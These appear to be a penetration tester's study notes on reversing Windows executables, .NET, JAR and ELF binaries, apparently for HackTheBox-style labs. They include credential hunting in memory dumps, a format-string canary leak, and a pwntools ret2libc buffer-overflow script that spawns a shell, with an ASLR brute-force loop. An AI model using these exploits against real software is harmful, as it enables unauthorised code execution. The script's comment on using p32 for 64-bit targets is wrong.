
# EXE & DLL
Every executable `.exe`, will have to call a DLL, a dinamically Linked Library, which is on the disk. They contain the functions that are being called by the executable. 

Given an executable, to understand which DLL it is linked to, monitor the process with`ProcMon64` from [SysInternals](https://learn.microsoft.com/en-gb/sysinternals/downloads/procmon).

Use `ilspycmd` on Linux to read the source code, or [dnSpy](https://github.com/0xd4d/dnSpy) on Windows, if you also need to debug.

## From Linux
1. `ilspycmd` (On Kali): is NET **decompiler**, it takes compiled .NET binaries and converts them back into readable C# source code.
	- Usually System and microsoft are not interesting:
		```bash
		ilspycmd --nested-directories -p -o src [EXE/DLL]
		```
2. go in the `src` directory and grep for interesting strings to find interesting files
3. C# online compiler
## From Windows
### x64dbg

- To avoid going through any `dll` files, navigate to `Options` -> `Preferences`, uncheck everything except `Exit Breakpoint`

-  right click inside the `CPU` view and `Follow in Memory Map`

- Check `MAP` types files for credentials &rarr; double click, check if interesting &rarr;  right-click on the address and select `Dump Memory to File`

  ```cmd
  .\strings64.exe [FILE]
  ```

### Thick Clients 

Applications that are installed locally on our computers, thus they do not require internet access to run.

Monitor the process with`ProcMon64` from [SysInternals](https://learn.microsoft.com/en-gb/sysinternals/downloads/procmon), look for generated files

- Run `strings64` on it
- `ProcMon64` from [SysInternals](https://learn.microsoft.com/en-gb/sysinternals/downloads/procmon) and monitoring the process after running it on the terminal
  - If some files are created, change the permissions of the folder to disallow file deletions &rarr; Look at the content
  - Check .bat files, change them (e.g. if they delete somthing)
- inspect `.exe` with `x64dbg` and look for memory dumps &rarr; run `strings`
- Use `de4dot` for `.NET` file as deobfuscator and depacker &rarr; read the source code by dragging and dropping it onto the `DnSpy` executable

Exploiting: https://0xdf.gitlab.io/2020/08/08/htb-fatty.html
# ELF Files
## Overview 
- **ELF (Executable and Linkable Format)**: Standard format for binaries and libraries (.so files) on Linux
- Libraries (.so) load into process memory at runtime
- Interesting targets even without privileges: sudo, SUID binaries
- **Tools**: Ghidra (developed by NSA), online decompiler: [https://dogbolt.org/](https://dogbolt.org/)
Process:
1. Find the main function
2. Check for vulnerable functions
## Initial Analysis
```bash
# Check file type and architecture
file binary_name

# Check security features
checksec binary_name

# List dynamic dependencies
ldd binary_name

# Run ltrace (traces library calls)
ltrace ./binary_name
```
## GDB/PEDA

  ```bash
  gdb [BINARY]
  gdb-peda$ info functions    # List all functions
  # Filter out: _*, frame_dummy, register, deregister functions
  
  # Disassemble the function, start with main
  gdb-peda$ disas [FUNCTION]
  ```
### Function calls
Example from disassembly:


```bash
call 0x5555555551b0 <SQLDriverConnect@plt>
```
- Function name: Inside `<>`, without `@plt`
- `@plt` indicates dynamic linking (Procedure Linkage Table)

### Function Arguments

**Arguments in REGISTERS** (first 6 arguments):
- `%rdi` / `%edi` (1st argument)
- `%rsi` / `%esi` (2nd argument)
- `%rdx` / `%edx` (3rd argument)
- `%rcx` / `%ecx` (4th argument)
- `%r8` / `%r8d` (5th argument)
- `%r9` / `%r9d` (6th argument)
**Arguments in Temporary Storage**
- `rax` / `eax` 
### Method

- Add breakpoints
  ```bash
  # Add a breakpoint after a function is called
  gdb-peda$ b [NAME OF THE FUNCTION]
  # List breakpoints
  gdb-peda$ i b
  # Delete brakpoint
  gdb-peda$ d [NUM OF BREAKPOINT]
  ```

- Run the program again

  To have better readability, since the CPU will be halted with a breakpoint, and you can check its status right before the call of the function with
  ```bash
  # Run until breakpoint
  gdb-peda$ r
  # check status of CPU
  gdb-peda$ i r
  # Continue after the breakpoint
  gdb-peda$ c
  # Jump only to the next assembly instruction
  gdb-peda$ nexti
  ```

  and check its arguments.

- Change the value of an argument -> exploit (e.g. SQL injection)
  ```bash
  gdb-peda$ set $[REGISTER]=0x[EX_VALUE] 
  ```
## Exploits
### Format Leak
```c
printf(buf)
# buf format is not so it can be anything
```
`%p` -> pointer to a stack address -> read the canary
The canary is the first address that terminates with `00` and starts with `0x55`, `0x56`, `0x7f`
### Overflow
Write until you reach the return pointer `eip/rip` and there, write a reverse shell. Ref. [October](https://0xdf.gitlab.io/2019/03/26/htb-october.html#privesc-to-root)
1. `ldd binary` -> get lib address. 
	 If it changes every time, put a random address in range, and loop the exploit until it works
2. `checksec` in `gdb`: check security flags
	- `NX`: Doesn't allow to write code in the stack -> use functions from ``
3. Write a python file 
4. Transfer the b64 payload if needed and give as argument:
   ```bash
   while true; do ./binary $(echo [B64 payload] | base64 -d); done
   ```


```python
from pwn import *

# ============ PROCESS SETUP ============

# For local exploits, different approaches:

# 1. Overflow via program argument
p = process(['./overflow', cyclic(5000)])

# 2. If program needs specific arguments before overflow
p = process(['./overflow', 'NORMAL_ARG1', 'NORMAL_ARG2', cyclic(5000)])

# 3. Overflow via input after program starts
p = process('./overflow')
p.sendlineafter(b'[INPUT_ANCHOR]', cyclic(5000))

# For remote exploits
p_remote = remote('192.168.1.100', 4444)  # Replace with actual IP/PORT

# ============ FIND OFFSET ============

# Let the program crash
p.wait()

# Find the offset where EIP/RIP is overwritten
offset = cyclic_find(p.corefile.eip)  # Use p.corefile.rip for 64-bit

print(f"Offset found: {offset}")

# ============ NX BYPASS ============

# Load the binary
context.binary = elf = ELF('./overflow', checksec=False)

# Get libc reference (uses the libc linked to the binary)
libc = elf.libc

# Set libc base address (for bypassing ASLR)
# You need to find this dynamically through info leak
libc.address = 0xf7d66000  # This is EXAMPLE - find actual address

# Get addresses of useful functions/strings
system_addr = libc.sym['system']
binsh_addr = next(libc.search(b'/bin/sh\x00'))

print(f"System: {hex(system_addr)}, /bin/sh: {hex(binsh_addr)}")

# ============ BUILD PAYLOAD ============

# Replace with p32 for 64 bits
payload = b'A' * offset          # Padding to reach return address
payload += p32(system_addr)      # Address of system() (overwrites EIP)
payload += b'CCCC'               # Return address after system() (garbage)
payload += p32(binsh_addr)       # Argument to system()

# Encode payload to base64 for command-line usage
payload_b64 = base64.b64encode(payload).decode('utf-8')
print(f"Base64 payload: {payload_b64}")

# Show how to use it from command line
print(f"\nCommand-line usage:")
print(f"  ./overflow $(echo {payload_b64} | base64 -d)")
print(f"\nAlternative (if binary reads from stdin):")
print(f"  echo {payload_b64} | base64 -d | ./overflow")

# ============ EXPLOIT ============

# Send the payload
p = process(['./overflow', payload])
p.interactive()  # Get shell access
```
## Signing elf binary
```bash
cd ~/TOOLS/linux-elf-binary-signer
#Create a C payload 
gcc payload.c -o payload
./elf-sign sha256 key.pem key.pem payload payload_signed
```
# .jar files 
`jadx-gui` &rarr; open the file in the GUI -> Source code -> look at main
- Search for `password` -> `Load all` -> `Limit to package:` main

# .apk file 
unzip -> decompile what you find (hacktricks)